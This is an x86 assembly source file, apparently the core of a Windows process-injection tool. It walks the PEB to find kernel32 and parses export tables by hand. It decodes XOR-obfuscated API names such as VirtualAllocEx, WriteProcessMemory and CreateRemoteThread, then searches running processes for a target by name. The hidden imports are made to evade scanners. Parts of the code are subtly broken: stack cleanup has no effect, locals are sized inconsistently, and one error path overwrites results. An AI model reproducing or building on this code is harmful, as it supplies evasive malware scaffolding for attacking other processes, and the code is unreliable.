; mem locations of function args are shown assuming the base pointer is setup as usual in prologue

; arg0: src                 [ebp + 8]
; arg1: dst                 [ebp + 12]
; arg2: nBytes              [esp + 16]
memcpy:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = esi
    ; ebp - 12 = edi
    sub esp, 12                 ; allocate local variable space

    mov dword [ebp - 4], 0      ; return value
    mov [ebp - 8], esi          ; save esi
    mov [ebp - 12], edi         ; save edi

    mov esi, [ebp + 8]          ; src
    mov edi, [ebp + 12]         ; dst
    mov ecx, [ebp + 16]         ; nBytes

    rep movsb                   ; mov from esi to edi until ecx == 0

.shutdown:
    mov eax, [ebp - 4]          ; return value
    mov esi, [ebp - 8]          ; restore esi
    mov edi, [ebp - 12]         ; restore edi

    add esp, 12                 ; free local variable space
    add esp, 12                 ; free arg stack
    
    leave
    ret

; arg0: str                 [ebp + 8]
;
; ret: num chars            eax
strlen:
    push ebp
    mov ebp, esp

    ; ebp - 4 = output strlen
    ; ebp - 8 = rsi
    sub esp, 8                  ; allocate local variable space

    mov dword [ebp - 4], 0      ; output
    mov [ebp - 8], esi          ; save esi

    mov esi, [ebp + 8]          ; str

    jmp .while_condition
    .loop:
        inc dword [ebp - 4]     ; ++strlen

        .while_condition:
            lodsb

            cmp al, 0           ; end of string ?
            jne .loop

.shutdown:
    mov esi, [ebp - 8]          ; restore esi
    mov eax, [ebp - 4]          ; output

    add esp, 8                  ; free local variable space
    add esp, 4                  ; free arg stack

    leave
    ret

; arg0: wstr        [ebp + 8]
;
; ret: num chars    eax
wstrlen:
    push ebp
    mov ebp, esp

    ; ebp - 4 = output strlen
    ; ebp - 8 = esi
    sub esp, 8                  ; allocate local variable space

    mov dword [ebp - 4], 0      ; output strlen
    mov [ebp - 8], esi          ; save esi

    mov esi, [ebp + 8]          ; wstr

    jmp .while_condition
    .loop:
        inc dword [ebp - 4]     ; ++strlen

        .while_condition:
            lodsw

            cmp ax, 0           ; end of string ?
            jne .loop       

.shutdown:
    mov esi, [ebp - 8]          ; save esi
    mov eax, [ebp - 4]          ; strlen

    add esp, 8                  ; free local variable space
    add esp, 4                  ; free arg stack

    leave
    ret

; arg0: src         [ebp + 8]
; arg1: dst         [ebp + 12]
strcpy:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = rsi
    ; ebp - 12 = rdi
    sub esp, 12                 ; allocate local variable space

    mov dword [ebp - 4], 0      ; return value
    mov [ebp - 8], esi          ; save esi
    mov [ebp - 12], edi         ; save edi

    mov esi, [ebp + 8]          ; src
    mov edi, [ebp + 12]         ; dst

.loop:
    lodsb

    cmp al, 0                   ; end of string ?
    je .loop_end                ; yes

    stosb
    jmp .loop

.loop_end:

.shutdown:
    mov edi, [ebp - 12]         ; restore edi
    mov esi, [ebp - 8]          ; restore esi
    mov eax, [ebp - 4]          ; return value

    add esp, 12                 ; free local variable space
    add esp, 8                  ; free arg stack

    leave
    ret

; arg0: src         [ebp + 8]
; arg1: dst         [ebp + 12]
wstrcpy:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = esi
    ; ebp - 12 = edi
    sub esp, 12                 ; allocate local variable space

    mov dword [ebp - 4], 0      ; return value
    mov [ebp - 8], esi          ; save esi
    mov [ebp - 12], edi         ; save edi

    mov esi, [ebp + 8]          ; src
    mov edi, [ebp + 12]         ; dst

.loop:
    lodsw

    cmp ax, 0                   ; end of string ?   
    je .loop_end                ; yes

    stosw
    jmp .loop

.loop_end:

.shutdown:
    mov edi, [ebp - 12]         ; restore edi
    mov esi, [ebp - 8]          ; restore esi
    mov eax, [ebp - 4]          ; return value

    add esp, 12                 ; free local variable space
    add esp, 8                  ; free arg stack

    leave
    ret


; arg0: str         [ebp + 8]
; arg1: wstr        [ebp + 12]
; arg2: str len     [ebp + 16]
;
; ret: 1 if equal   eax
strcmpAW:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = esi
    ; ebp - 12 = edi
    sub esp, 12                 ; allocate local variable space

    mov dword [ebp - 4], 0      ; return value
    mov [ebp - 8], esi          ; save esi
    mov [ebp - 12], edi         ; save edi

    mov esi, [ebp + 8]          ; str
    mov edi, [ebp + 12]         ; wstr
    mov ecx, [ebp + 16]         ; str len

.loop:
    movzx eax, byte [esi]
    movzx edx, byte [edi]

    cmp al, dl

    jne .loop_end_not_equal

    inc esi
    add edi, 2

    dec ecx
    jnz .loop

    .loop_end_equal:
        mov dword [ebp - 4], 1
        jmp .shutdown

    .loop_end_not_equal:
        mov dword [ebp - 4], 0
        jmp .shutdown

.shutdown:
    mov edi, [ebp - 12]         ; restore edi
    mov esi, [ebp - 8]          ; restore esi
    mov eax, [ebp - 4]          ; returm value

    add esp, 12                 ; free local variable space
    add esp, 12                 ; free arg stack

    leave
    ret

; arg0: str         [ebp + 8]
; arg1: wstr        [ebp + 12]
; arg2: str len     [ebp + 16]
strcmpiAW:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = rsi
    ; ebp - 12 = rdi
    sub esp, 12                 ; allocate local variable space

    mov dword [ebp - 4], 0      ; return value
    mov [ebp - 8], esi          ; save esi
    mov [ebp - 12], edi         ; save edi

    mov esi, [ebp + 8]          ; str
    mov edi, [ebp + 12]         ; wstr
    mov ecx, [ebp + 16]         ; str len

.loop:
    movzx eax, byte [esi]
    movzx edx, byte [edi]

    cmp al, dl

    jg .al_more_than_dl
    jl .al_less_than_dl

.continue_loop:
    inc esi
    add edi, 2
    dec ecx
    jnz .loop

    jmp .loop_end_equal

    .al_more_than_dl:
        add dl, 32
        cmp al, dl
        
        jne .loop_end_not_equal
        jmp .continue_loop

    .al_less_than_dl:
        add al, 32
        cmp al, dl

        jne .loop_end_not_equal
        jmp .continue_loop

.loop_end_not_equal:
    mov dword [ebp - 4], 0
    jmp .shutdown

.loop_end_equal:
    mov dword [ebp - 4], 1
    jmp .shutdown

.shutdown:
    mov edi, [ebp - 12]         ; restore edi
    mov esi, [ebp - 8]          ; restore esi
    mov eax, [ebp - 4]          ; return value

    add esp, 12                 ; free local variable space
    add esp, 12                 ; free arg stack

    leave
    ret

; arg0: str1        [ebp + 8]
; arg1: str2        [ebp + 12]
; arg2: str1 len    [ebp + 16]
;
; ret: 1 if equal   eax
strcmpAA:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = rsi
    ; ebp - 12 = rdi
    sub esp, 12                 ; allocate local variable space 

    mov dword [ebp - 4], 0            ; return value
    mov [ebp - 8], esi          ; save esi
    mov [ebp - 12], edi         ; save edi

    mov esi, [ebp + 8]          ; str1
    mov edi, [ebp + 12]         ; str2
    mov ecx, [ebp + 16]         ; str1 len

    repe cmpsb
    jecxz .equal

    .not_equal:
        mov dword [ebp - 4], 0        ; return value
        jmp .shutdown

    .equal:
        mov dword [ebp - 4], 1        ; return value
        jmp .shutdown

.shutdown:    
    mov edi, [ebp - 12]         ; restore edi
    mov esi, [ebp - 8]          ; restore esi
    mov eax, [ebp - 4]          ; return value

    add esp, 12                 ; free local variable space
    add esp, 12                 ; free arg stack

    leave
    ret

; arg0: str         [ebp + 8]
; arg1: wstr        [ebp + 12]
; arg2: str len     [ebp + 16]
strcmpiAA:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = rsi
    ; ebp - 12 = rdi
    sub esp, 12                 ; allocate local variable space

    mov dword [ebp - 4], 0      ; return value
    mov [ebp - 8], esi          ; save esi
    mov [ebp - 12], edi         ; save edi

    mov esi, [ebp + 8]          ; str
    mov edi, [ebp + 12]         ; wstr
    mov ecx, [ebp + 16]         ; str len

.loop:
    movzx eax, byte [esi]
    movzx edx, byte [edi]

    cmp al, dl

    jg .al_more_than_dl
    jl .al_less_than_dl

.continue_loop:
    inc esi
    inc edi
    dec ecx
    jnz .loop

    jmp .loop_end_equal

    .al_more_than_dl:
        add dl, 32
        cmp al, dl
        
        jne .loop_end_not_equal
        jmp .continue_loop

    .al_less_than_dl:
        add al, 32
        cmp al, dl

        jne .loop_end_not_equal
        jmp .continue_loop

.loop_end_not_equal:
    mov dword [ebp - 4], 0
    jmp .shutdown

.loop_end_equal:
    mov dword [ebp - 4], 1
    jmp .shutdown

.shutdown:
    mov edi, [ebp - 12]         ; restore edi
    mov esi, [ebp - 8]          ; restore esi
    mov eax, [ebp - 4]          ; return value

    add esp, 12                 ; free local variable space
    add esp, 12                 ; free arg stack

    leave
    ret

; arg0: str                     [ebp + 8]
; arg1: chr                     [ebp + 12]
;
; ret:  ptr to chr else -1      eax
strchr:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value cRet
    ; ebp - 8 = strlen
    ; ebp - 12 = c
    ; ebp - 16 = ebx
    sub esp, 16                         ; allocate local variable space

    mov dword [ebp - 4], -1             ; cRet
    mov [ebp - 16], ebx                 ; save ebx

    push dword [ebp + 8]                ; str
    call strlen

    mov [ebp - 8], eax                  ; strlen

    mov dword [ebp - 12], 0             ; c = 0
    .loop:
        mov edx, [ebp + 8]              ; str
        mov ebx, [ebp - 12]             ; c

        movzx ecx, byte [edx + ebx]     ; str[c]

        cmp cl, [ebp + 12]              ; str[c] == chr ?
        je .equal

        inc dword [ebp - 12]            ; ++c
        mov eax, [ebp - 8]              ; strlen
        cmp [ebp - 12], eax             ; c < strlen

        jne .loop
        jmp .shutdown

        .equal:
            add edx, ebx                ; str + c
            mov [ebp - 4], edx          ; cRet = str + c

            jmp .shutdown

.shutdown:
    mov eax, [ebp - 4]                  ; return value
    mov ebx, [ebp - 16]                 ; restore ebx

    add esp, 16                         ; free local variable space
    add esp, 8                          ; free arg stack

    leave
    ret

; arg0: data            [ebp + 8]
; arg1: data_len        [ebp + 12]
; arg2: key             [ebp + 16]
; arg3: key_len         [ebp + 20]
my_xor:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = i
    ; ebp - 12 = j
    ; ebp - 16 = bInput
    ; ebp - 20 = b
    ; ebp - 24 = data_bit_i
    ; ebp - 28 = key_bit_j
    ; ebp - 32 = bit_xor
    ; ebp - 36 = ebx
    sub esp, 36                                 ; allocate local variable space

    mov dword [ebp - 4], 0                      ; return value
    mov dword [ebp - 8], 0                      ; i = 0
    mov dword [ebp - 12], 0                     ; j = 0
    mov [ebp - 36], ebx                         ; save rbx

    .data_loop:
        mov eax, [ebp - 12]                     ; j in eax
        cmp eax, [ebp + 20]                     ; j == key_len ?

        jne .continue_data_loop
        mov dword [ebp - 12], 0                 ; j = 0
        
    .continue_data_loop:
        mov dword [ebp - 16], 0                 ; bInput = 0
        mov dword [ebp - 20], 0                 ; b = 0

        .bit_loop:
        ; bit test data
            mov edx, [ebp + 8]                  ; ptr to data in rdx
            mov ebx, [ebp - 8]                  ; i in rbx

            movzx eax, byte [edx + ebx]         ; data char in al
            movzx ebx, byte [ebp - 20]          ; b in bl

            bt eax, ebx

            jc .data_bit_is_set
            mov dword [ebp - 24], 0             ; data_bit_i = 0
            jmp .bit_loop_continue_data

            .data_bit_is_set:
                mov dword [ebp - 24], 1         ; data_bit_i = 1

        .bit_loop_continue_data:
            ; bit test key

            mov edx, [ebp + 16]                 ; ptr to key in rdx
            mov ebx, [ebp - 12]                 ; j in rbx
            
            movzx eax, byte [edx + ebx]         ; key char in al
            movzx ebx, byte [ebp - 20]          ; b in bl

            bt eax, ebx

            jc .key_bit_is_set
            mov dword [ebp - 28], 0             ; key_bit_i = 0
            jmp .bit_loop_continue_key

            .key_bit_is_set:
                mov dword [ebp - 28], 1         ; key_bit_i = 1

        .bit_loop_continue_key:

            movzx eax, byte [ebp - 24]          ; data_bit_i in al
            cmp al, [ebp - 28]                  ; data_bit_i == key_bit_i ?

            je .bits_equal
            ; bits are unequal
            mov dword eax, 1
            movzx ecx, byte [ebp - 20]          ; b in cl
            shl al, cl
            mov [ebp - 32], al                  ; bit_xor = (data_bit_i != key_bit_j) << b

            jmp .bits_continue
            .bits_equal:
            ; bits equal
            ; so (data_bit_i != key_bit_j) == 0
                mov dword [ebp - 32], 0         ; bit_xor = 0

        .bits_continue:
            movzx eax, byte [ebp - 16]          ; bInput in al
            or al, [ebp - 32]                   ; bInput |= bit_xor

            mov [ebp - 16], al                  ; al to bInput

            inc dword [ebp - 20]                ; ++b
            mov dword eax, [ebp - 20]           ; b in eax
            cmp dword eax, 8                    ; b == 8 ?
            jnz .bit_loop


        mov dword edx, [ebp + 8]                ; ptr to data in rdx
        mov dword ebx, [ebp - 8]                ; i in rbx

        movzx eax, byte [ebp - 16]              ; bInput in al
        mov [edx + ebx], al                     ; data[i] = bInput

        inc dword [ebp - 12]                    ; ++j

        inc dword [ebp - 8]                     ; ++i
        mov eax, [ebp - 8]                      ; i in eax
        cmp eax, [ebp + 12]                     ; i == data_len ?

        jne .data_loop

.shutdown:
    mov ebx, [ebp - 36]                         ; restore rbx
    mov eax, [ebp - 4]                          ; return value

    add esp, 36                                 ; free local variable space
    add esp, 16                                 ; free arg stack

    leave
    ret


; ret: kernel module handle     eax
get_kernel_module_handle:
    push ebp
    mov ebp, esp

    ; ebp - 4 = first list entry
    ; ebp - 8 = current list entry
    ; ebp - 12 = table entry
    ; ebp - 16 = kernel mod addr
    sub esp, 16                                 ; allocate local variable space

    push xor_key.len
    push xor_key
    push kernel32_xor.len
    push kernel32_xor
    call my_xor

    mov eax, fs:[0x30]                          ; peb
    add eax, 0xc                                ; *ldr
    mov eax, [eax]                              ; ldr
    add eax, 0x14                               ; InMemoryOrderModuleList

    mov [ebp - 4], eax                          ; *FirstModule
    mov eax, [eax]                              ; FirstModule
    mov [ebp - 8], eax                          ; CurrentModule

.loop:
    cmp eax, [ebp - 4]                          ; CurrentModule == FirstModule ?
    je .loop_end_equal
        sub eax, 8                              ; *TableEntry
        mov [ebp - 12], eax                     ; *TableEntry

        add eax, 0x2c                           ; *BaseDLLName
        add eax, 0x4                            ; BaseDLLName->Buffer

        push kernel32_xor.len
        push dword [eax]                      ; BaseDLLName.Buffer
        push kernel32_xor
        call strcmpiAW

        cmp eax, 1                              ; strings match
        je .module_found

        mov eax, [ebp - 8]                      ; CurrentModule
        mov eax, [eax]                          ; CurrentModule = CurrentMdoule->Flink
        mov [ebp - 8], eax                      ; CurrentModule

        jmp .loop

.module_found:
    mov eax, [ebp - 12]                         ; *TableEntry
    add eax, 0x18                               ; TableEntry->DllBase
    mov eax, [eax]                              ; DllBase 
    mov [ebp - 16], eax                         ; mod addr

    jmp .shutdown

.loop_end_equal:

.shutdown:
    add esp, 16                                 ; free local variable space

    mov eax, [ebp - 16]                         ; mod addr

    leave
    ret


; arg0: base addr           [ebp + 8]
; arg1: proc name           [ebp + 12]
; arg2: proc name len       [ebp + 16]
;
; ret:  proc addr           eax
get_proc_address_by_name:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = nt headers
    ; ebp - 12 = export data directory
    ; ebp - 16 = export directory
    ; ebp - 20 = address of functions
    ; ebp - 24 = address of names
    ; ebp - 28 = address of name ordinals
    ; ebp - 284 = forwarded dll.function name - 256 bytes
    ; ebp - 288 = function name
    ; ebp - 292 = loaded forwarded library addr
    ; ebp - 296 = function name strlen
    ; ebp - 300 = ebx
    ; ebp - 304 = temp var (r8)
    ; ebp - 308 = temp var (r9)
    ; ebp - 312 = temp var (r10)
    ; ebp - 316 = temp var (r11)
    sub esp, 316                                ; allocate local variable space

    mov dword [ebp - 4], 0                      ; return value
    mov [ebp - 300], ebx                        ; save ebx
   
    mov ebx, [ebp + 8]                          ; base addr
    add ebx, 0x3c                               ; *e_lfa_new

    movzx ecx, word [ebx]                       ; e_lfanew

    mov eax, [ebp + 8]                          ; base addr
    add eax, ecx                                ; nt header

    mov [ebp - 8], eax                          ; nt header

    add eax, 24                                 ; optional header
    add eax, 96                                 ; export data directory

    mov [ebp - 12], eax                         ; export data directory

    mov eax, [ebp + 8]                          ; base addr
    mov ecx, [ebp - 12]                         ; export data directory
    mov ebx, [ecx]
    add eax, ebx                                ; export directory

    mov [ebp - 16], eax                         ; export directory

    add eax, 28                                 ; address of functions rva
    mov eax, [eax]                              ; rva in eax
    add eax, [ebp + 8]                          ; base addr + address of function rva

    mov [ebp - 20], eax                         ; address of functions

    mov eax, [ebp - 16]                         ; export directory
    add eax, 32                                 ; address of names rva
    mov eax, [eax]                              ; rva in eax
    add eax, [ebp + 8]                          ; base addr + address of names rva

    mov [ebp - 24], eax                         ; address of names

    mov eax, [ebp - 16]                         ; export directory
    add eax, 36                                 ; address of name ordinals
    mov eax, [eax]                              ; rva in eax
    add eax, [ebp + 8]                          ; base addr + address of name ordinals

    mov [ebp - 28], eax                         ; address of name ordinals

    mov eax, [ebp - 16]
    mov [ebp - 312], eax                        ; export directory
    add dword [ebp - 312], 12                   ; number of names
    mov eax, ebp
    sub eax, 312
    mov eax, [eax]
    mov [ebp - 312], eax                        ; number of names in [ebp - 312]

    mov dword [ebp - 316], 0                    ; index
.loop_func_names:
    ; to index into an array, we multiply the size of each element with the 
    ; current index and add it to the base addr of the array
    mov dword eax, 4                            ; size of dword
    mul dword [ebp - 316]                       ; size * index
    mov ebx, [ebp - 24]                         ; address of names
    add ebx, eax                                ; address of names + n
    mov ebx, [ebx]                              ; address of names [n]

    add ebx, [ebp +  8]                         ; base addr + address of names [n]

    push dword [ebp + 16]                         ; proc name arg len
    push ebx
    push dword [ebp + 12]                         ; proc name arg
    call strcmpiAA

    cmp eax, 1                                  ; are strings equal
    je .function_found

    inc dword [ebp - 316]
    mov eax, [ebp - 312]
    cmp [ebp - 316], eax
    jne .loop_func_names

    jmp .shutdown

.function_found:
    mov eax, 2
    mul dword [ebp - 316]                       ; index * size of element of addrees of name ordinals(word)
    add eax, [ebp - 28]                         ; address of name ordinals + n
    movzx eax, word [eax]                       ; address of name ordinals [n]; index into address of functions

    mov ebx, 4                                  ; size of element of address of functions(dword)
    mul ebx                                     ; index * size of element
    add eax, [ebp - 20]                         ; address of functions + index
    mov eax, dword [eax]                        ; address of functions [index]

    add eax, [ebp + 8]                          ; base addr + address of functions [index]

    mov [ebp - 4], eax                          ; return value

    ; check if the function is forwarded
    mov eax, [ebp + 8]
    mov [ebp - 304], eax                        ; base addr
    mov eax, [ebp - 12]                         ; export data directory
    mov eax, [eax]                              ; export data directory virtual address
    add [ebp - 304], eax                        ; base addr + virtual addr

    mov eax, [ebp - 304]
    mov [ebp - 308], eax
    mov eax, [ebp - 12]                         ; export data directory
    add eax, 4                                  ; export data directory size
    mov eax, [eax]                              ; export data directory size
    add [ebp - 308], eax                        ; base addr + virtual addr + size

    mov eax, [ebp - 304]
    cmp [ebp - 4], eax                          ; below the start of the export directory
    jl .shutdown                                ; not forwarded
    ; or
    mov eax, [ebp - 308]
    cmp [ebp - 4], eax                          ; above the end of the export directory
    jg .shutdown                                ; not forwarded

    ; make a copy of the string of the forwarded dll
    push dword [ebp - 4]
    mov eax, ebp
    sub eax, 284
    push eax
    call strcpy

    ; find the position of the '.' which separates the dll name and function name
    push dword  '.'
    mov eax, ebp
    sub eax, 284
    push eax
    call strchr                                 ; ptr to chr in eax
    
    mov byte [eax], 0
    inc eax

    mov [ebp - 288], eax                        ; forwarded function name

    cmp dword [load_library_a], 0                  ; is load_library_a proc available
    je .error_shutdown

    mov eax, ebp
    sub eax, 284
    push eax
    call [load_library_a]                          ; library addr

    mov [ebp - 292], eax                        ; library addr

    push dword [ebp - 288]
    call strlen                                 ; strlen in eax

    mov [ebp - 296], eax                        ; function name strlen

    push dword [ebp - 292]
    push dword [ebp - 288]
    push dword [ebp - 296]
    call get_proc_address_by_name               ; proc addr

    mov [ebp - 4], eax                          ; proc addr

.error_shutdown:
    mov dword [ebp - 4], 0                      ; proc addr not found

.shutdown:
    mov ebx, [ebp - 300]                        ; restore ebx
    mov eax, [ebp - 4]                          ; return value

    add esp, 316                                ; free local variable space
    add esp, 12                                 ; free arg stack

    leave
    ret

; arg0: base addr               [ebp + 8]
; arg1: proc name               [ebp + 12]
;
; return: proc addr             eax
get_proc_address_by_get_proc_addr:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    sub esp, 4                      ; allocate local variable space

    mov dword [ebp - 4], 0          ; return value
    
    cmp dword [get_proc_addr], 0    ; is GetProcAddress available ?
    je .shutdown

    push dword [ebp + 12]           ; proc name
    push dword [ebp + 8]            ; base addr
    call [get_proc_addr]            ; proc addr

    mov [ebp - 4], eax              ; return value

.shutdown:
    mov eax, [ebp - 4]              ; return value

    add esp, 12                     ; free arg stack

    leave
    ret

; arg0: base addr               [ebp + 8]
; arg1: xor str                 [ebp + 12]
; arg2: xor str len             [ebp + 16]
; arg3: is get proc addr        [ebp + 20]
;
; return: proc addr             eax
unxor_and_get_proc_addr:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    sub esp, 4                                  ; allocate local variable space

    mov dword [ebp - 4], 0                      ; return value

    push xor_key.len
    push xor_key
    push dword [ebp + 16]                       ; xor str key
    push dword [ebp + 12]                       ; xor str
    call my_xor

    cmp dword [ebp + 20], 1                     ; is get proc addr
    jne .not_get_proc_addr
        push dword [ebp + 16]                         ; xor str len
        push dword [ebp + 12]                         ; xor str
        push dword [ebp + 8]                          ; base addr
        call get_proc_address_by_name

        mov [ebp - 4], eax                      ; return value

        jmp .shutdown

.not_get_proc_addr:
    push dword [ebp + 16]                             ; xor str len
    push dword [ebp + 12]                             ; xor str
    push dword [ebp + 8]                              ; base addr
    call get_proc_address_by_get_proc_addr

    mov [ebp - 4], eax                          ; return value

    jmp .shutdown

.shutdown:
    mov eax, [ebp - 4]                          ; return value

    add esp, 4                                  ; free local variable space
    add esp, 16                                 ; free arg stack

    leave
    ret

; arg0: kernel base addr        ebp + 8
populate_kernel_function_ptrs_by_name:
    push ebp
    mov ebp, esp

    push dword 1
    push get_proc_addr_xor.len
    push get_proc_addr_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_proc_addr], eax                    ; GetProcAddress addr

    push dword 0
    push dword get_last_error_xor.len
    push dword get_last_error_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_last_error], eax                   ; GetLastError addr

    push dword 0
    push dword load_library_a_xor.len
    push dword load_library_a_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [load_library_a], eax                      ; load_library_aA addr

    push dword 0
    push dword get_current_process_xor.len
    push dword get_current_process_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_current_process], eax              ; GetCurrentProcess addr

    push dword 0
    push dword open_process_xor.len
    push dword open_process_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [open_process], eax                     ; OpenProcess addr

    push dword 0
    push dword create_file_a_xor.len
    push dword create_file_a_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [create_file_a], eax                      ; CreateFileA addr

    push dword 0
    push dword write_file_xor.len
    push dword write_file_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [write_file], eax                       ; WriteFile addr

    push dword 0
    push dword virtual_alloc_xor.len
    push dword virtual_alloc_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_alloc], eax                    ; VirtualAlloc addr

    push dword 0
    push dword virtual_alloc_ex_xor.len
    push dword virtual_alloc_ex_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_alloc_ex], eax                 ; VirtualAllocEx addr

    push dword 0
    push dword virtual_free_ex_xor.len
    push dword virtual_free_ex_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_free_ex], eax                  ; VirtualFreeEx addr

    push dword 0
    push dword virtual_protect_xor.len
    push dword virtual_protect_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_protect], eax                  ; VirtualProtect addr

    push dword 0
    push dword virtual_protect_ex_xor.len
    push dword virtual_protect_ex_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_protect_ex], eax               ; VirtualProtectEx addr

    push dword 0
    push dword read_process_memory_xor.len
    push dword read_process_memory_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [read_process_memory], eax              ; ReadProcessMemory addr

    push dword 0
    push dword write_process_memory_xor.len
    push dword write_process_memory_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [write_process_memory], eax             ; WriteProcessMemory addr

    push dword 0
    push dword create_remote_thread_xor.len
    push dword create_remote_thread_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [create_remote_thread], eax             ; CreateRemoteThread addr
     
    push dword 0
    push dword wait_for_single_object_xor.len
    push dword wait_for_single_object_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [wait_for_single_object], eax           ; WaitForSingleObject addr
 
    push dword 0
    push dword close_handle_xor.len
    push dword close_handle_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [close_handle], eax                     ; CloseHandle addr

    push dword 0
    push dword create_toolhelp32_snapshot_xor.len
    push dword create_toolhelp32_snapshot_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [create_toolhelp32_snapshot], eax       ; CreateToolhelp32Snapshot addr

    push dword 0
    push dword process32_first_xor.len
    push dword process32_first_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [process32_first], eax                  ; Process32First addr

    push dword 0
    push dword process32_next_xor.len
    push dword process32_next_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [process32_next], eax                   ;  Process32Next addr

    push dword 0
    push dword sleep_xor.len
    push dword sleep_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [sleep], eax                            ; Sleep addr

    push dword 0
    push dword resume_thread_xor.len
    push dword resume_thread_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [resume_thread], eax                    ; ResumeThread addr

    push dword 0
    push dword output_debug_string_a_xor.len
    push dword output_debug_string_a_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [output_debug_string_a], eax            ; OutputDebugStringA addr

.shutdown:
    add esp, 4                                  ; free arg stack

    leave
    ret


; arg0: proc name       ebp + 8
; arg1: proc name len   ebp + 12
;
; ret: proc id          eax
find_target_process_id:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = snapshot handle
    ; ebp - 296 = process entry struct
    sub esp, 296                                ; allocate locate variable space

    mov dword [ebp - 4], 0                      ; return value

    push 0
    push TH32CS_SNAPPROCESS
    call [create_toolhelp32_snapshot]           ; snapshot handle

    cmp eax, INVALID_HANDLE_VALUE
    je .shutdown

    mov [ebp - 8], eax                          ; snapshot handle
    mov dword [ebp - 580], 564                  ; processentry32.dwsize

    mov eax, ebp
    sub eax, 580                                ; &processentry
    push eax
    push dword [ebp - 8]                              ; snapshot handle 
    call [process32_first]

    cmp eax, 0                                  ; if !process32First
    je .shutdown

.loop:
    mov eax, ebp
    sub eax, 296                                ; &processentry
    push eax
    push dword [ebp - 8]                              ; snapshot handle 
    call [process32_next]

    cmp eax, 0
    je .loop_end
        push dword [ebp + 12]                   ; proc name len
        mov eax, ebp
        sub eax, 296                            ; processEntry32
        add eax, 36                             ; processEntry32.szExeFile
        push eax
        push dword [ebp + 8]                    ; proc name
        call strcmpiAA

        cmp eax, 1                              ; are strings equal
        je .process_found

        jmp .loop

.process_found:
    mov eax, ebp
    sub eax, 296                                ; *processentry32
    add eax, 8                                  ; processentry32->procID

    mov eax, [eax]
    mov [ebp - 4], eax

.loop_end:

.shutdown:
    add esp, 580                                ; free local variable space
    add esp, 8                                  ; free arg stack

    leave
    ret